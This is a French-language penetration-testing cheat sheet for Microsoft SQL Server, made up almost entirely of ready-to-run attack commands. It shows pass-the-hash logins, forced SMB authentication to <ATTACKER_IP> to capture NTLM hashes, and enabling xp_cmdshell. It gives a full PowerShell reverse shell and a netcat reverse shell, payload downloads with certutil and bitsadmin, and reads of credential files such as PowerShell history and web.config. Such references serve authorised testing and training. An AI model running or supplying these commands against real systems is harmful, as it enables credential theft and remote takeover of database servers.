# MSSQL Pentesting

## Connexion

```bash
# SQL Auth
mssqlclient.py username:'password'@<TARGET>

# Windows Auth
mssqlclient.py DOMAIN/user:'password'@<TARGET> -windows-auth

# Pass-the-Hash
mssqlclient.py -hashes :<NTLM> DOMAIN/user@<TARGET> -windows-auth

# Kerberos
export KRB5CCNAME=/path/to/ticket.ccache
mssqlclient.py -k -no-pass hostname.domain.com
```

## Énumération

### Informations serveur

```sql
-- Version
SELECT @@VERSION;

-- Détails
SELECT 
    SERVERPROPERTY('MachineName') AS machine,
    SERVERPROPERTY('ServerName') AS server,
    SERVERPROPERTY('Edition') AS edition;

-- Utilisateur actuel
SELECT SYSTEM_USER;
SELECT CURRENT_USER;

-- Base actuelle
SELECT DB_NAME();
```

### Privilèges

```sql
-- Vérifier sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Tous les rôles
SELECT 'sysadmin' AS role, IS_SRVROLEMEMBER('sysadmin') AS is_member
UNION ALL SELECT 'serveradmin', IS_SRVROLEMEMBER('serveradmin')
UNION ALL SELECT 'securityadmin', IS_SRVROLEMEMBER('securityadmin');

-- Permissions effectives
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

### Utilisateurs et rôles

```sql
-- Tous les logins
SELECT name, type_desc, is_disabled FROM sys.server_principals
WHERE type IN ('S','U','G');

-- Membres sysadmin
SELECT r.name AS role_name, mp.name AS member_name
FROM sys.server_role_members srm
JOIN sys.server_principals r ON srm.role_principal_id = r.principal_id
JOIN sys.server_principals mp ON srm.member_principal_id = mp.principal_id
WHERE r.name = 'sysadmin';
```

### SID Enumeration

```sql
-- SID actuel
SELECT SUSER_SID();

-- SID d'un utilisateur/groupe
SELECT SUSER_SID('DOMAIN\username');

-- Convertir SID en nom
SELECT SUSER_SNAME(0x01050000...);
```

### Bases de données

```sql
-- Lister
SELECT name, state_desc FROM sys.databases;

-- Tables
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- Colonnes sensibles
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%password%'
   OR COLUMN_NAME LIKE '%pwd%';
```

### Configuration

```sql
-- Configurations importantes
SELECT name, value_in_use FROM sys.configurations
WHERE name IN ('xp_cmdshell', 'Ad Hoc Distributed Queries');
```

## Hash Capture

### Méthode xp_dirtree

**1. Lancer Responder:**
```bash
sudo responder -I tun0
```

**2. Forcer authentification SMB:**
```sql
EXEC xp_dirtree '\\<ATTACKER_IP>\share';

-- Alternatives
EXEC xp_fileexist '\\<ATTACKER_IP>\share\file.txt';
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share';
```

**3. Responder capture:**
```
[SMB] NTLMv2-SSP Username : DOMAIN\serviceaccount
[SMB] NTLMv2-SSP Hash     : serviceaccount::DOMAIN:...
```

**4. Cracker:**
```bash
echo "hash" > hash.txt
hashcat -m 5600 hash.txt rockyou.txt
```

### Autres méthodes

```sql
-- Via BACKUP
BACKUP DATABASE master TO DISK = '\\<ATTACKER_IP>\share\backup.bak';

-- Via xp_cmdshell
EXEC xp_cmdshell 'net use \\<ATTACKER_IP>\share';
```

---

## xp_cmdshell

### Activation

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Commandes de base

```sql
-- Reconnaissance
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig';

-- Fichiers
EXEC xp_cmdshell 'dir C:\';
EXEC xp_cmdshell 'type C:\path\to\file.txt';
```

### Reverse Shell

**PowerShell:**
```sql
EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''<ATTACKER_IP>'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

**Netcat:**
```sql
-- Télécharger nc.exe
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>/nc.exe C:\temp\nc.exe';

-- Reverse shell
EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe <ATTACKER_IP> 4444';
```

### Téléchargement de fichiers

```sql
-- certutil
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>/file.exe C:\temp\file.exe';

-- PowerShell
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<ATTACKER_IP>/file.exe -OutFile C:\temp\file.exe"';

-- bitsadmin
EXEC xp_cmdshell 'bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>/file.exe C:\temp\file.exe';
```

---

## OPENROWSET (Lecture de fichiers)

### Activation

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;
```

### Lecture

```sql
-- Syntaxe
SELECT * FROM OPENROWSET(
    BULK '<FILE_PATH>',
    SINGLE_CLOB
) AS x;

-- Historique PowerShell
SELECT * FROM OPENROWSET(
    BULK 'C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',
    SINGLE_CLOB
) AS x;

-- Web.config
SELECT * FROM OPENROWSET(
    BULK 'C:\inetpub\wwwroot\web.config',
    SINGLE_CLOB
) AS x;
```

### Fichiers intéressants

```
# Credentials
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Windows\System32\inetsrv\config\applicationHost.config

# Config
C:\inetpub\wwwroot\web.config
C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
```

### Filtrer le contenu

```sql
SELECT value
FROM OPENROWSET(
    BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',
    SINGLE_CLOB
) AS x
CROSS APPLY STRING_SPLIT(CAST(BulkColumn AS VARCHAR(MAX)), CHAR(13)+CHAR(10))
WHERE value LIKE '%password%'
   OR value LIKE '%ConvertTo-SecureString%';
```

## Script d'énumération complet

```sql
PRINT '=== SERVER ===';
SELECT @@VERSION;
SELECT SYSTEM_USER;

PRINT '=== PRIVILEGES ===';
SELECT IS_SRVROLEMEMBER('sysadmin');

PRINT '=== LOGINS ===';
SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G');

PRINT '=== SYSADMIN MEMBERS ===';
SELECT mp.name FROM sys.server_role_members srm
JOIN sys.server_principals r ON srm.role_principal_id = r.principal_id
JOIN sys.server_principals mp ON srm.member_principal_id = mp.principal_id
WHERE r.name = 'sysadmin';

PRINT '=== DATABASES ===';
SELECT name FROM sys.databases;

PRINT '=== CONFIG ===';
SELECT name, value_in_use FROM sys.configurations
WHERE name IN ('xp_cmdshell','Ad Hoc Distributed Queries');
```
